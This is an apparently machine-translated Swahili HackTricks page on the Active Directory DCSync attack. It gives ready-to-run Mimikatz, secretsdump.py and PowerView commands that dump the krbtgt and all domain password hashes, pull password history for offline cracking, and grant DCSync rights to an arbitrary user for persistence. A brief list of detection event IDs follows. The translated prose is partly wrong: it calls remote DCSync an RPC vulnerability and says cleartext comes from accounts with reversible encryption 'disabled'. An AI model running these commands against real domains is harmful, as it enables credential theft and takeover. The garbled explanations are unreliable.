# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kuautomatisha** mchakato wa kazi kwa kutumia zana za jamii za **kisasa zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## DCSync

Kibali cha **DCSync** kinamaanisha kuwa na kibali hiki juu ya kikoa yenyewe: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** na **Replicating Directory Changes In Filtered Set**.

**Maelezo muhimu kuhusu DCSync:**

* Shambulio la **DCSync linajifanya kuwa ni tabia ya Domain Controller na kuomba Domain Controllers nyingine kuiga habari** kwa kutumia Huduma ya Mbali ya Usambazaji wa Direktori (MS-DRSR). Kwa kuwa MS-DRSR ni kazi halali na muhimu ya Active Directory, haiwezi kuzimwa au kufungwa.
* Kwa chaguo-msingi, kikundi cha **Domain Admins, Enterprise Admins, Administrators, na Domain Controllers** ndio kinachohitaji kibali kinachohitajika.
* Ikiwa nywila za akaunti yoyote zimehifadhiwa kwa njia ya kusomeka upya, kuna chaguo katika Mimikatz kurudisha nywila kwa maandishi wazi.

### Uthibitishaji

Angalia ni nani anaye na kibali hiki kwa kutumia `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Tumia Udhaifu Kwa Njia ya Ndani

Kuna njia kadhaa za kutumia udhaifu wa mfumo wa Active Directory kwa njia ya ndani. Moja ya njia hizo ni kwa kutumia mbinu inayoitwa DCSync. Mbinu hii inaruhusu mtu kuchukua maelezo ya hash ya nenosiri kutoka kwa seva ya udhibiti wa kikoa (Domain Controller) na kuzitumia kwa madhumuni mabaya.

Kwa kutekeleza DCSync, unahitaji kupata ufikiaji wa kiwango cha juu kwenye mfumo wa Active Directory. Hii inaweza kufanyika kwa njia ya kudukua akaunti ya mtumiaji au kupata ufikiaji wa kiwango cha juu kupitia njia nyinginezo kama vile kudukua seva ya udhibiti wa kikoa.

Baada ya kupata ufikiaji wa kiwango cha juu, unaweza kutumia zana kama mimikatz kutekeleza DCSync. Zana hii itachukua maelezo ya hash ya nenosiri kutoka kwa seva ya udhibiti wa kikoa na kuziokoa kwenye faili. Kisha, unaweza kutumia maelezo hayo ya hash ya nenosiri kwa madhumuni mabaya, kama vile kudukua akaunti za watumiaji wengine au kupata ufikiaji usioidhinishwa kwenye mfumo wa Active Directory.

Ni muhimu kuzingatia kuwa kutekeleza DCSync ni kinyume cha sheria na inaweza kusababisha madhara makubwa. Ni muhimu kufuata sheria na kanuni za maadili wakati wa kufanya shughuli za udukuzi au upimaji wa usalama.
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Kutumia Kijijini

Kutumia kijijini ni mbinu ya kudukua ambayo inaruhusu mtu kudukua mfumo wa AD (Active Directory) kutoka kwa umbali. Mbinu hii inategemea udhaifu katika itifaki ya RPC (Remote Procedure Call) ambayo inaruhusu mawasiliano kati ya kompyuta mbili kwenye mtandao.

Kwa kudukua kijijini, unaweza kutumia zana kama `mimikatz` au `secretsdump.py` kudukua nywila za akaunti za AD na hata kupata hash za nywila za akaunti za msimamizi. Kwa kufanya hivyo, unaweza kupata ufikiaji usimamizi wa mfumo wa AD na kudhibiti mazingira ya AD.

Kwa kufanikisha kudukua kijijini, unahitaji kujua anwani ya IP ya kijijini na kuwa na ufikiaji wa mtandao unaoruhusu mawasiliano na mfumo wa AD. Pia, unahitaji kujua udhaifu wa RPC ambao unaweza kutumia kudukua mfumo wa AD.

Kumbuka kwamba kutumia kijijini ni shughuli haramu na inaweza kusababisha mashtaka ya kisheria. Ni muhimu kufuata sheria na kanuni zinazohusiana na uhalifu wa mtandao katika eneo lako.
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` inazalisha faili 3:

* moja na **hash za NTLM**
* moja na **funguo za Kerberos**
* moja na nywila wazi kutoka NTDS kwa akaunti yoyote iliyo na [**encryption inayoweza kurejeshwa**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) imezimishwa. Unaweza kupata watumiaji na encryption inayoweza kurejeshwa na

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Uthabiti

Ikiwa wewe ni msimamizi wa kikoa, unaweza kutoa ruhusa hii kwa mtumiaji yeyote kwa msaada wa `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Kisha, unaweza **kuchunguza ikiwa mtumiaji amepewa kwa usahihi** haki hizo 3 kwa kuzitafuta kwenye matokeo ya (unapaswa kuweza kuona majina ya haki hizo ndani ya uga wa "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Kupunguza Hatari

* Tukio la Usalama ID 4662 (Sera ya Ukaguzi kwa kitu lazima iwe imewezeshwa) - Operesheni ilifanywa kwenye kitu
* Tukio la Usalama ID 5136 (Sera ya Ukaguzi kwa kitu lazima iwe imewezeshwa) - Kitu cha huduma ya saraka kilibadilishwa
* Tukio la Usalama ID 4670 (Sera ya Ukaguzi kwa kitu lazima iwe imewezeshwa) - Ruhusa kwenye kitu zilibadilishwa
* AD ACL Scanner - Unda na linganisha ripoti za ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Marejeo

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia kiotomatiki** mchakato wa kazi ulioendeshwa na zana za jamii **za hali ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
